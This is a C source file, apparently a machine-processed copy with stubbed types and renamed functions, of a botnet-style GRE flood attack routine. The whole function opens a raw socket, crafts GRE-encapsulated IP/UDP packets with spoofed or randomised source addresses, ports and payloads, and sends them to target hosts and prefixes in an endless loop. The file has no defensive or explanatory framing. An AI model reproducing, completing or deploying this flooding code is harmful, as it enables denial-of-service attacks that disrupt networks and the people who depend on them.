#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
typedef  int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; int daddr; void* check; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
struct grehdr {void* protocol; } ;
struct TYPE_3__ {int s_addr; } ;
struct TYPE_4__ {scalar_t__ sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct attack_target {int addr; int netmask; TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef  int port_t ;
typedef  void* BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_DPORT ; 
 int /*<<< orphan*/  ATK_OPT_GRE_CONSTIP ; 
 int /*<<< orphan*/  ATK_OPT_IP_DF ; 
 int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
 int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
 int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_RAND ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
 int /*<<< orphan*/  ATK_OPT_SOURCE ; 
 int /*<<< orphan*/  ATK_OPT_SPORT ; 
 int ETH_P_IP ; 
 int FALSE ; 
 int /*<<< orphan*/  IPPROTO_GRE ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int LOCAL_ADDR ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int TRUE ; 
 void* FUNC0 (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 void* FUNC1 (int,int) ; 
 void* FUNC2 (int*,int) ; 
 scalar_t__ FUNC3 (struct iphdr*,struct udphdr*,void*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 scalar_t__ errno ; 
 int FUNC5 (scalar_t__) ; 
 void* FUNC6 (int) ; 
 scalar_t__ FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (char*,int) ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC12 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

void FUNC14(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = FUNC1(targs_len, sizeof (char *));
    uint8_t ip_tos = FUNC0(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = FUNC0(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = FUNC0(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = FUNC0(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = FUNC0(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = FUNC0(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = FUNC0(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = FUNC0(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = FUNC13(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (FUNC12(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        FUNC4(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;

        pkts[i] = FUNC1(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = FUNC6(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = FUNC6(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = FUNC6(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        // GRE header init
        greh->protocol = FUNC6(ETH_P_IP); // Protocol is 2 bytes

        // Encapsulated IP header init
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = FUNC6(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = FUNC6(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = FUNC6(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = FUNC9();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = FUNC6(sport);
        udph->dest = FUNC6(dport);
        udph->len = FUNC6(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = FUNC5(FUNC7(targs[i].addr) + (((uint32_t)FUNC9()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = FUNC9();

            if (ip_ident == 0xffff)
            {
                iph->id = FUNC9() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = FUNC9() & 0xffff;
            if (dport == 0xffff)
                udph->dest = FUNC9() & 0xffff;

            if (!gcip)
                greiph->daddr = FUNC9();
            else
                greiph->daddr = iph->daddr;

            if (data_rand)
                FUNC10(data, data_len);

            iph->check = 0;
            iph->check = FUNC2((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = FUNC2((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = FUNC3(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            FUNC11(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}